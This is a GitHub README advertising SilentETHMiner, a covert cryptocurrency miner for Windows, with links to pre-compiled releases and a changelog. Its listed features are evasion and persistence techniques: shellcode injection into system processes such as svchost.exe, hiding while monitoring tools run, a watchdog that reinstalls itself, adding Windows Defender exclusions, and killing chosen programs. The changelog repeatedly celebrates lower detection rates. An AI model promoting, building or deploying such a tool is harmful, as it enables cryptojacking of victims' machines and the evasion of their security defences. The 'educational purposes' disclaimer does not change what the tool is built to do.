
<img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">

# SilentETHMiner v1.6.1 - Based on Lime Miner v0.3

# The new unified Silent Crypto Miner is now released https://github.com/UnamSanctam/SilentCryptoMiner

Can mine any Ethash or Etchash cryptocurrency.

## Main Features

* Native & .NET - Miner installer and watchdog coded in C#, Shellcode loader/injector coded in C, miner requires .NET Framework 4.5
* Shellcode - All .NET C# parts are converted into Shellcode and injected using a native C loader, can be disabled
* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or other processes
* Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
* Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
* Ethash/Etchash - Supports mining all Ethash/Etchash coins like Ethereum, Ethereum Classic, Etho, Metaverse, Ellaism, QuarkChain and others
* Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
* Process Killer - Constantly checks for any programs in the "Kill Targets" and kills them if found

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentETHMiner/releases

## My Other Miners

[Silent XMR (Monero) Miner](https://github.com/UnamSanctam/SilentXMRMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentETHMiner/wiki) or at the top of the page.

## Mining Requirements

When mining with the Ethash or the Etchash algorithm you need to have enough GPU memory left to store the DAG. So for example, mining Ethereum requires you to have at least a minimum GPU memory of 4.4 GB available since that is the size of the DAG as of writing this. Due to this, GPUs that have less available memory than the required DAG are not able to mine at all. You can mine Ethash/Etchash cryptocurrencies that have a lower DAG size like Ethereum Classic (ETC). 
The other thing required is a recent enough CUDA or OpenCL compatible driver for your GPU.

So the requirements are as follow:
1. Enough GPU memory for the DAG
2. Supported drivers

## Changelog

### v1.6.1 (10/10/2021)
* Added Process Killer feature that constantly checks for the "Kill Targets" programs and kills them if found
* Added failover capability for the Remote Configuration URL, add several URLs by separating them with a comma (,)
* Changed system calls to direct system calls thus reducing detections
* Changed native loader code to reduce detections
* Removed Online Download feature due to domain being taken down
* Improved overall code
* Updated miner
### v1.6.0 (02/10/2021)
**The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
* Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
* Added custom tcc C compiler to compile the Shellcode loader
* Added custom windres resource compiler to allow icons, assembly data and run as administrator for the native C program
* Added donut to convert .NET programs into Shellcode
* Added option to disable Shellcode loader
* Remade and optimized much of the miner and watchdog code
* Removed old C# loader
* Renamed Install to Startup due to confusion

[You can view the full Changelog here](CHANGELOG.md)

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

LINK: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3
